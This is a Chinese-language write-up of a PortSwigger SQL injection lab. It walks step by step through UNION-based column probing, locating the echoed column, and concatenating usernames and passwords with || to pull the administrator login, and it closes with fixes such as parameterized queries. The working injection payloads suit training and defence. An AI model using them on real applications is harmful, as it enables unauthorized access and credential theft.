# PortSwigger · SQLi · UNION attack, retrieving multiple values in a single column

- 平台 / 分类 / 难度：PortSwigger / SQL injection / Apprentice
- 日期：2026-10-23

> 一句话结论：先探列数、定位回显列，再用 `||` 把 username 和 password 拼成一列塞进单个回显位，最后用 administrator 的凭据登录。

## 1. 目标

从 users 表取出 administrator 的用户名和密码，登录后台。

## 2. 确定列数

两种方法，判据都是状态码：

| 方法 | Payload | 判据 |
|---|---|---|
| UNION 递增 NULL | `' UNION SELECT NULL--` → `NULL,NULL--` | 500 = 列数不匹配；200 = 匹配 |
| ORDER BY 递增 | `' ORDER BY 1--` → `2--` → `3--` | 第一次 500 的边界 -1 即列数 |

结论：2 列。

## 3. 定位回显列

- `' UNION SELECT 'testing',NULL--` → 500（第 1 列不是字符串型）
- `' UNION SELECT NULL,'testing'--` → 200，页面回显 testing

→ 第 2 列会回显，且为字符串类型。

> 为什么先用 NULL：NULL 可与任何类型隐式兼容，未知列类型时不会因类型不匹配报错。

## 4. 拼接并提取数据

先试 T-SQL 的 `+`：

```
' UNION SELECT NULL,username + '~' + password FROM users--
```

→ 500，排除 `+` 拼接。

改用 `||`：

```
' UNION SELECT NULL,username || '~' || password FROM users--
```

→ 200，回显：

```
administrator~2mx8nkwtjay28vbvwxec
```

用 administrator / 上述密码登录 → 通关。

## 5. 为什么有效

原始查询：

```sql
SELECT id, name FROM products WHERE category = 'Gifts' AND released = 1
```

注入后：

```sql
SELECT id, name FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, username || '~' || password FROM users-- ' AND released = 1
```

单引号让输入跳出字符串字面量；UNION 追加一条自构造查询；`--` 注释掉原本的 `' AND released = 1`，避免语法错误。

## 6. 容易踩的点

- `--` 在 MySQL 中必须跟一个空白字符才生效，URL 末尾建议写 `--+` 或 `-- -`。
- 注释符因库而异：MySQL 可用 `#` / `-- `；Oracle、SQL Server 用 `--`。
- MySQL 默认的 `||` 是逻辑或，`||` 能通说明后端更可能是 PostgreSQL / Oracle / SQLite 一类。
- UNION 要求列数一致、类型兼容，这解释了第 1 列为什么必须填 NULL。

## 7. 修复

成因：单引号被当作 SQL 代码而非数据。

修复：参数化查询 / 预编译，让输入永远作为值绑定，不参与语句结构解析。

辅助：收敛错误信息（不要把 500 堆栈返给前端）、数据库账号最小权限。
